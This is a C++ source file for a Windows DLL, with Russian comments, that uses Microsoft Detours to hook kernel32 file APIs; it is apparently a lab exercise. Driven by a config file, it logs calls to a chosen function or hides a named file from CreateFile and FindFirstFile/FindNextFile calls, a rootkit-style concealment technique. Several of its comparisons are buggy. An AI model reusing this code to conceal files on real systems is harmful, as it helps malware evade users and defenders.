#define _CRT_SECURE_NO_WARNINGS
#undef UNICODE
#include <cstdio>
#include <windows.h>
#include <detours.h>
#include <stdlib.h>
#include <iostream>
#include <string>
#include < io.h >
using namespace std;

#define BUFFER_SIZE 1024



CHAR		 FunctionName[BUFFER_SIZE];// = "FindNextFileW\0";
WCHAR fileToCompare[256] = { 0 };
std::string	 FileName;// = "Server.exe\0";
std::wstring WFull_Path;
std::wstring WPath;
std::wstring WFileName;// = L"Server.exe\0";
std::string fileToHide;// = "Server.exe\0";
std::wstring fileToCmp;
extern "C" VOID Hook64(VOID);
extern "C" LPVOID DynamicTarget = NULL;




HANDLE(WINAPI* pCreateFileA) (LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile) = CreateFileA;
HANDLE(WINAPI* pCreateFileW) (LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile) = CreateFileW;
HANDLE(WINAPI* pFindFirstFileW) (LPCWSTR lpFileName, LPWIN32_FIND_DATAW lpFindFileData) = FindFirstFileW;
HANDLE(WINAPI* pFindFirstFileA)(LPCSTR lpFileName, LPWIN32_FIND_DATA lpFindFileData) = FindFirstFileA;
BOOL(WINAPI* pFindNextFileW) (HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData) = FindNextFileW;
BOOL(WINAPI* pFindNextFileA) (HANDLE hFindFile, LPWIN32_FIND_DATAA  lpFindFileData) = FindNextFileA;
HANDLE(WINAPI* pFindFirstFileExA) (LPCSTR lpFileName, FINDEX_INFO_LEVELS fInfoLevelId, LPVOID lpFindFileData, FINDEX_SEARCH_OPS  fSearchOp, LPVOID lpSearchFilter, DWORD dwAdditionalFlags) = FindFirstFileExA;
HANDLE(WINAPI* pFindFirstFileExW) (LPCWSTR lpFileName, FINDEX_INFO_LEVELS fInfoLevelId, LPVOID lpFindFileData, FINDEX_SEARCH_OPS  fSearchOp, LPVOID lpSearchFilter, DWORD dwAdditionalFlags) = FindFirstFileExW;





typedef HANDLE(WINAPI* fnCreateFileW)(
    LPCWSTR lpFileName,
    DWORD dwDesiredAccess,
    DWORD dwShareMode,
    LPSECURITY_ATTRIBUTES lpSecurityAttributes,
    DWORD dwCreationDisposition,
    DWORD dwFlagsAndAttributes,
    HANDLE hTemplateFile);
fnCreateFileW realCreateFileW = CreateFileW;





extern "C" VOID DynamicDetour()
{
    SYSTEMTIME SysTime;
    GetLocalTime(&SysTime);
    cout << "Wi find you, he-he)))" << endl;
    const wchar_t* fileName = L"C:\\Users\\Owl\\Desktop\\file.txt";
    HANDLE hFile = pCreateFileW(
        fileName, // Имя файла
        GENERIC_WRITE, // Доступ для записи
        0, // Флаги доступа
        NULL, // Атрибуты безопасности
        CREATE_ALWAYS, // Создать новый файл, если он не существует
        FILE_ATTRIBUTE_NORMAL, // Нормальные атрибуты
        NULL
    );

    char dataToWrite[256] = { 0 };
    sprintf(dataToWrite, "%02d:%02d:%02d  %s\0", SysTime.wHour, SysTime.wMinute, SysTime.wSecond, FunctionName);
    const char* constData = dataToWrite;
    DWORD bytesWritten;
    if (!WriteFile(hFile, // Дескриптор файла
        constData, // Данные для записи
        strlen(constData), // Количество байт для записи
        &bytesWritten, // Количество записанных байт
        NULL)) {
        std::cerr << "Ошибка записи в файл: " << GetLastError() << std::endl;
        CloseHandle(hFile);
    }

    // Закрываем файл
    CloseHandle(hFile);
    std::cout << "Данные записаны в файл " << fileName << std::endl;

}


HANDLE WINAPI MySpecialCreateFileW(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile)
{
  //  if (lpFileName == L"C:\\Users\\Owl\\Desktop\\file.txt") return pCreateFileW(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
    SYSTEMTIME SysTime;
    GetLocalTime(&SysTime);
    cout << "Wi find you, he-he)))" << endl;
    const wchar_t* fileName = L"C:\\Users\\Owl\\Desktop\\file.txt";

    //while (_access("C:\\Users\\Owl\\Desktop\\file.txt", 00) == 0) Sleep (100);
    HANDLE hFile = pCreateFileW(
        fileName, // Имя файла
        GENERIC_WRITE, // Доступ для записи
        0, // Флаги доступа
        NULL, // Атрибуты безопасности
        CREATE_ALWAYS, // Создать новый файл, если он не существует
        FILE_ATTRIBUTE_NORMAL, // Нормальные атрибуты
        NULL
    );

    char dataToWrite[256] = { 0 };
    sprintf(dataToWrite, "%02d:%02d:%02d  %s %S\0", SysTime.wHour, SysTime.wMinute, SysTime.wSecond, FunctionName, lpFileName);
    const char* constData = dataToWrite;
    DWORD bytesWritten;
    if (!WriteFile(hFile, // Дескриптор файла
        constData, // Данные для записи
        strlen(constData), // Количество байт для записи
        &bytesWritten, // Количество записанных байт
        NULL)) {
        std::cerr << "Ошибка записи в файл: " << GetLastError() << std::endl;
        CloseHandle(hFile);
    }

    // Закрываем файл
    CloseHandle(hFile);
    

   // while (_access("C:\\Users\\Owl\\Desktop\\file.txt", 00) == 0);//пока файл существует
//    rename("C:\\Users\\Owl\\Desktop\\file1.txt", "C:\\Users\\Owl\\Desktop\\file.txt");

    std::cout << "Данные записаны в файл " << fileName << std::endl;
    return pCreateFileW(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);

}


HANDLE WINAPI MyCreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile)
{
    if (lpFileName == FileName)
    {
        return INVALID_HANDLE_VALUE;
    }
    return pCreateFileA(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
}



HANDLE WINAPI MyCreateFileW_withHide(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile)
{
 //   return INVALID_HANDLE_VALUE;
  //  if (!wcscmp(lpFileName, L"C:\\Users\\Owl\\Desktop\\new.txt\0"))//WFileName)
    if (!wcscmp(lpFileName, fileToCompare)||lpFileName == WFileName)
    {
        return INVALID_HANDLE_VALUE;
    }
    return pCreateFileW(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
}

HANDLE WINAPI MyFindFirstFileA_withHide(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData)
{
    if (lpFileName == FileName)
    {
        return INVALID_HANDLE_VALUE;
    }
    return pFindFirstFileA(lpFileName, lpFindFileData);
}

HANDLE WINAPI MyFindFirstFileW_withHide(LPCWSTR lpFileName, LPWIN32_FIND_DATAW lpFindFileData)
{
    if (lpFileName == WFileName)
    {
        return INVALID_HANDLE_VALUE;
    }
    return pFindFirstFileW(lpFileName, lpFindFileData);
}

BOOL WINAPI MyFindNextFileA_withHide(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData)
{
    bool ret = pFindNextFileA(hFindFile, lpFindFileData);
    if (lpFindFileData->cFileName == FileName)
    {
        ret = pFindNextFileA(hFindFile, lpFindFileData);
    }
    return ret;
}

BOOL WINAPI MyFindNextFileW_withHide(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData)
{

    bool ret = pFindNextFileW(hFindFile, lpFindFileData);
    if (lpFindFileData->cFileName == WFileName)
    {
        ret = pFindNextFileW(hFindFile, lpFindFileData);
    }
    return ret;
}

HANDLE MyFindFirstFileExW_withHide(LPCWSTR a0, FINDEX_INFO_LEVELS a1, LPWIN32_FIND_DATAW a2, FINDEX_SEARCH_OPS a3, LPVOID a4, DWORD a5)
{
    HANDLE ret = pFindFirstFileExW(a0, a1, a2, a3, a4, a5);

    if (a2->cFileName == WFileName)
    {
        ret = INVALID_HANDLE_VALUE;
    }
    return ret;
}

HANDLE MyFindFirstFileExA_withHide(LPCSTR a0, FINDEX_INFO_LEVELS a1, LPWIN32_FIND_DATAA a2, FINDEX_SEARCH_OPS a3, LPVOID a4, DWORD a5)
{
    HANDLE ret = pFindFirstFileExA(a0, a1, a2, a3, a4, a5);
    if (a2->cFileName == FileName)
    {
        pFindNextFileA(ret, a2);
    }
    return ret;
}



int HideFile(std::string& fileName)
{
    DetourTransactionBegin();
    DetourUpdateThread(GetCurrentThread());
    DetourAttach(&(PVOID&)pCreateFileA, MyCreateFileA);
    LONG err = DetourTransactionCommit();
    if (err != NO_ERROR)
    {
        return -1;
    }

    DetourTransactionBegin();
    DetourUpdateThread(GetCurrentThread());
    DetourAttach(&(PVOID&)pCreateFileW, MyCreateFileW_withHide);
    err = DetourTransactionCommit();
    if (err != NO_ERROR)
    {
        return -1;
    }

    DetourTransactionBegin();
    DetourUpdateThread(GetCurrentThread());
    DetourAttach(&(PVOID&)pFindFirstFileW, MyFindFirstFileW_withHide);
    err = DetourTransactionCommit();
    if (err != NO_ERROR)
    {
        return -1;
    }

    DetourTransactionBegin();
    DetourUpdateThread(GetCurrentThread());
    DetourAttach(&(PVOID&)pFindFirstFileA, MyFindFirstFileA_withHide);
    err = DetourTransactionCommit();
    if (err != NO_ERROR)
    {
        return -1;
    }

    DetourTransactionBegin();
    DetourUpdateThread(GetCurrentThread());
    DetourAttach(&(PVOID&)pFindNextFileW, MyFindNextFileW_withHide);
    err = DetourTransactionCommit();
    if (err != NO_ERROR)
    {
        return -1;
    }

    DetourTransactionBegin();
    DetourUpdateThread(GetCurrentThread());
    DetourAttach(&(PVOID&)pFindNextFileA, MyFindNextFileA_withHide);
    err = DetourTransactionCommit();
    if (err != NO_ERROR)
    {
        return -1;
    }

    DetourTransactionBegin();
    DetourUpdateThread(GetCurrentThread());
    DetourAttach(&(PVOID&)pFindFirstFileExW, MyFindFirstFileExW_withHide);
    err = DetourTransactionCommit();
    if (err != NO_ERROR)
    {
        return -1;
    }

    DetourTransactionBegin();
    DetourUpdateThread(GetCurrentThread());
    DetourAttach(&(PVOID&)pFindFirstFileExA, MyFindFirstFileExA_withHide);
    err = DetourTransactionCommit();
    if (err != NO_ERROR)
    {
        return -1;
    }

    return 0;
}



void funcDetect() {
    DynamicTarget = DetourFindFunction("kernel32.dll", FunctionName); 
    DetourTransactionBegin(); 
    DetourUpdateThread(GetCurrentThread()); 
    DetourAttach(&(PVOID&)DynamicTarget, Hook64);
    LONG Error = DetourTransactionCommit(); 
    cout << "Nuw we will detect ypu function!!" << endl;
    
}


int myAngryHook() {

    DetourTransactionBegin();
    DetourUpdateThread(GetCurrentThread());
    DetourAttach(&(PVOID&)pCreateFileA, MyCreateFileA);
    LONG err = DetourTransactionCommit();
    if (err != NO_ERROR)
    {
        return -1;
    }

    DetourTransactionBegin();
    DetourUpdateThread(GetCurrentThread());
    DetourAttach(&(PVOID&)pCreateFileW, MyCreateFileW_withHide);
    err = DetourTransactionCommit();
    if (err != NO_ERROR)
    {
        return -1;
    }

    DetourTransactionBegin();
    DetourUpdateThread(GetCurrentThread());
    DetourAttach(&(PVOID&)pFindFirstFileW, MyFindFirstFileW_withHide);
    err = DetourTransactionCommit();
    if (err != NO_ERROR)
    {
        return -1;
    }

    DetourTransactionBegin();
    DetourUpdateThread(GetCurrentThread());
    DetourAttach(&(PVOID&)pFindFirstFileA, MyFindFirstFileA_withHide);
    err = DetourTransactionCommit();
    if (err != NO_ERROR)
    {
        return -1;
    }

    DetourTransactionBegin();
    DetourUpdateThread(GetCurrentThread());
    DetourAttach(&(PVOID&)pFindNextFileW, MyFindNextFileW_withHide);
    err = DetourTransactionCommit();
    if (err != NO_ERROR)
    {
        return -1;
    }

    DetourTransactionBegin();
    DetourUpdateThread(GetCurrentThread());
    DetourAttach(&(PVOID&)pFindNextFileA, MyFindNextFileA_withHide);
    err = DetourTransactionCommit();
    if (err != NO_ERROR)
    {
        return -1;
    }

    DetourTransactionBegin();
    DetourUpdateThread(GetCurrentThread());
    DetourAttach(&(PVOID&)pFindFirstFileExW, MyFindFirstFileExW_withHide);
    err = DetourTransactionCommit();
    if (err != NO_ERROR)
    {
        return -1;
    }

    DetourTransactionBegin();
    DetourUpdateThread(GetCurrentThread());
    DetourAttach(&(PVOID&)pFindFirstFileExA, MyFindFirstFileExA_withHide);
    err = DetourTransactionCommit();
    if (err != NO_ERROR)
    {
        return -1;
    }

    return 0;
    
}

INT APIENTRY DllMain(HMODULE hDLL, DWORD Reason, LPVOID Reserved)
{
	switch (Reason)
	{
	case DLL_PROCESS_ATTACH:
	{
        char command[256] = { 0 };
        char param[256] = { 0 };
        char command2[256] = { 0 };
        char param2[256] = { 0 };
        FILE* config = fopen("C:\\Users\\Owl\\Desktop\\config.txt", "r");
        fscanf(config, "%s%s", command, param);
        if (!strcmp(command, "func")) {
            strcpy(FunctionName, param);
            cout << "Search function: " << FunctionName << endl;
            if (!strcmp(FunctionName, "CreateFileW\0")) {
                DetourTransactionBegin(); 
                DetourUpdateThread(GetCurrentThread()); 
                DetourAttach(&(PVOID&)pCreateFileW, MySpecialCreateFileW); 
                LONG Error = DetourTransactionCommit(); 
                cout << "Detection create file. It is spec case" << endl;
            }

            else funcDetect();
        }
        if (!strcmp(command, "hide")) {
            WFileName =wstring(&param[0], &param[strlen(param)]);
            
            FileName = param;
            wcscpy(fileToCompare,WFileName.c_str());
            wcscat(fileToCompare, L"\0");
            std::wcout << "HideFile: " << WFileName << endl;

            myAngryHook();
        }
        fclose(config);

        
		return TRUE;
	}
	break;
	
	}
	return TRUE;
	
}

